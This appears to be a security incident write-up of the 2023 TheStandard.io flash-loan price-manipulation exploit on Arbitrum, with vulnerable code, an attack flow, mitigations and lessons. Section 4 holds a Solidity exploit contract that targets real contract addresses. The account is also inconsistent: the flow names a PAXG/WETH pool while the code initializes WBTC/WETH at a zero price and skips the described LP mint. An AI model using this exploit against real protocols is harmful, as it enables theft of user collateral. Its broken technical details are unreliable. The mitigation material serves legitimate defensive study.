# TheStandard.io Price Manipulation Attack Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | TheStandard.io |
| Date | 2023-11-30 |
| Chain | Arbitrum |
| Loss | ~$290,000 USD |
| Attack Type | UniswapV3 Flash Loan + SmartVault Price Manipulation (Flash Loan + Price Manipulation via LP Position) |
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Attacker Address | `0x09ed480feaf4cbc363481717e04e2c394ab326b4` |
| Attack Contract | `0xb589d4a36ef8766d44c9785131413a049d51dbc0` |
| Vulnerable Contract | `0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC` (SmartVaultManagerV2) |
| Fork Block | 147,817,765 |

## 2. Vulnerable Code Analysis

TheStandard.io's `SmartVaultManagerV2` is a protocol that allows users to deposit collateral such as ETH, WBTC, and PAXG to mint the EUROs stablecoin. The SmartVault's `swap()` function referenced the current Camelot/UniswapV3 pool price directly without using an oracle, enabling an attacker to manipulate a liquidity position via flash loan and execute collateral swaps at a distorted price.

```solidity
// Vulnerable pattern: SmartVaultV2.swap() - direct reference to current pool price
contract SmartVaultV2 {
    // Vulnerable: swap executed based on current UniswapV3 pool sqrtPriceX96
    // No price manipulation defense (TWAP not used)
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
        uint256 swapFee = ISmartVaultManagerV2(manager).swapFeeRate() * _amount / ISmartVaultManagerV2(manager).HUNDRED_PC();
        address inToken = getSwapAddressFor(_inToken);
        uint256 minimumAmountOut = calculateMinimumAmountOut(_inToken, _outToken, _amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: inToken,
            tokenOut: getSwapAddressFor(_outToken),
            // Vulnerable: minimum output calculated from current pool state → manipulable
            amountOutMinimum: minimumAmountOut,
            ...
        });
        // Executed at an unfavorable price in the manipulated pool
        SWAP_ROUTER.exactInputSingle(params);
    }
}
```

**Vulnerability**: The attacker supplied liquidity over an extreme tick range to the WBTC/WETH pool via the UniswapV3 position manager (`PositionsNFT`), distorting the pool's current price (`sqrtPriceX96`). Because SmartVault's `swap()` references the current pool price without TWAP, collateral was swapped at the manipulated price.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: UniswapV3 Flash Loan + SmartVault Price Manipulation (Flash Loan + Price Manipulation via LP Position)
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x09ed480feaf4cbc363481717e04e2c394ab326b4]
  │
  ├─1─▶ Flash loan from UniswapV3 WBTC/WETH pool
  │      [WBTC_WETH: 0x2f5e87C9312fa29aed5c179E456625D79015299c]
  │      Acquire large amounts of WBTC + WETH
  │
  ├─2─▶ SmartVaultManagerV2.mint()
  │      [SmartVaultManagerV2: 0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC]
  │      Create new SmartVaultV2 + PositionsNFT
  │
  ├─3─▶ PositionsNFT.createAndInitializePoolIfNecessary()
  │      [PositionsNFT: 0xC36442b4a4522E871399CD717aBDD847Ab11FE88]
  │      Initialize PAXG/WETH pool with manipulated initial price
  │
  ├─4─▶ PositionsNFT.mint() — supply liquidity over extreme tick range
  │      Distort WBTC/WETH pool price via manipulated sqrtPriceX96
  │
  ├─5─▶ SmartVaultV2.mint() — mint EUROs against distorted collateral price
  │      Mint far more EUROs than actual collateral value
  │
  ├─6─▶ SmartVaultV2.swap(WBTC → WETH or PAXG → WETH)
  │      Swap at manipulated price → acquire collateral tokens
  │
  ├─7─▶ PositionsNFT.decreaseLiquidity() + collect()
  │      Withdraw provided liquidity
  │
  └─8─▶ Repay flash loan + realize ~$290K profit
         [Arbitrum: Camelot V3 Router 0x1F721E2E82F6676FCE4eA07A5958cF098D339e18]
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPositionsNFT {
    function mint(NonfungiblePositionManager.MintParams memory params)
        external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
    function decreaseLiquidity(NonfungiblePositionManager.DecreaseLiquidityParams memory params)
        external payable returns (uint256 amount0, uint256 amount1);
    function collect(NonfungiblePositionManager.CollectParams memory params)
        external payable returns (uint256 amount0, uint256 amount1);
    function createAndInitializePoolIfNecessary(
        address token0, address token1, uint24 fee, uint160 sqrtPriceX96
    ) external payable returns (address pool);
}

interface ISmartVaultManagerV2 {
    function mint() external returns (address vault, uint256 tokenId);
}

interface ISmartVaultV2 {
    function mint(address _to, uint256 _amount) external;
    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
}

contract TheStandardExploit {
    IPositionsNFT constant PositionsNFT = IPositionsNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IERC20 constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 constant WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 constant PAXG = IERC20(0xfEb4DfC8C4Cf7Ed305bb08065D08eC6ee6728429);
    ISmartVaultManagerV2 constant SmartVaultManagerV2 =
        ISmartVaultManagerV2(0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC);
    Uni_Pair_V3 constant WBTC_WETH = Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);

    address smartVault;
    uint256 vaultTokenId;

    function exploit() external {
        // Acquire WBTC + WETH via UniV3 flash loan
        WBTC_WETH.flash(address(this), 10e8, 10000e18, abi.encode(true));
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        // Create SmartVault
        (smartVault, vaultTokenId) = SmartVaultManagerV2.mint();

        // Initialize pool + manipulate price via liquidity
        PositionsNFT.createAndInitializePoolIfNecessary(
            address(WBTC), address(WETH), 3000, /* manipulated sqrtPriceX96 */ 0
        );

        // Mint EUROs at manipulated price
        ISmartVaultV2(smartVault).mint(address(this), type(uint256).max);

        // Extract collateral via swap
        ISmartVaultV2(smartVault).swap(
            bytes32("WBTC"), bytes32("WETH"), WBTC.balanceOf(smartVault)
        );

        // Repay flash loan
        WBTC.transfer(msg.sender, 10e8 + fee0);
        WETH.transfer(msg.sender, 10000e18 + fee1);
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) |
| Vulnerability Type | SmartVault swap() function references manipulable UniswapV3 spot price |
| Impact Scope | Entire TheStandard.io SmartVaultManagerV2 collateral pool |
| Explorer | [Arbiscan](https://arbiscan.io/address/0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC) |

## 6. Security Recommendations

```solidity
// Fix 1: Use TWAP oracle
import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";

function getTimeWeightedPrice(address pool, uint32 period) internal view returns (uint256) {
    (int24 arithmeticMeanTick,) = OracleLibrary.consult(pool, period);
    return OracleLibrary.getQuoteAtTick(arithmeticMeanTick, 1e18, token0, token1);
}

function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external onlyOwner {
    // Calculate minimum output based on TWAP (30-minute average)
    uint256 twapPrice = getTimeWeightedPrice(pool, 1800);
    uint256 minimumAmountOut = twapPrice * _amount * (1e4 - MAX_SLIPPAGE) / 1e4;
    // ...
}

// Fix 2: Compare against Chainlink oracle price
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

function calculateMinimumAmountOut(...) internal view returns (uint256) {
    // Compare Chainlink price with current pool price; revert if deviation exceeds threshold
    (, int256 chainlinkPrice,,,) = priceFeed.latestRoundData();
    uint256 poolPrice = getPoolPrice();
    require(
        abs(int256(poolPrice) - chainlinkPrice) * 1e4 / chainlinkPrice < MAX_DEVIATION,
        "Price deviation too high"
    );
    return _amount * uint256(chainlinkPrice) * (1e4 - slippage) / 1e4;
}

// Fix 3: Block pool initialization + swap within the same block
mapping(address => uint256) public poolCreationBlock;

function createAndInitializePool(...) external {
    poolCreationBlock[newPool] = block.number;
}

function swap(...) external {
    require(block.number > poolCreationBlock[pool] + MIN_BLOCKS, "Pool too new");
}
```

## 7. Lessons Learned

1. **Never trust UniswapV3 spot price**: The `sqrtPriceX96` from `slot0()` can be manipulated within a single transaction. TWAP (30 minutes or longer) must always be used for collateral valuation or swap minimum output calculations.
2. **SmartVault + LP position combination**: An architecture where swaps are executed through UniswapV3 positions within a SmartVault exposes the protocol to a compound attack where an attacker manipulates pool prices via LP positions and executes favorable swaps inside the vault.
3. **Flash loan + LP mint attack**: The pattern of acquiring large assets via flash loan and momentarily manipulating prices through UniswapV3 LP positions is effective on L2 networks such as Arbitrum as well.
4. **$290K-scale price manipulation**: Attacks of the same scale as Ethereum mainnet are possible on Arbitrum, and L2 DeFi protocols require the same level of oracle security.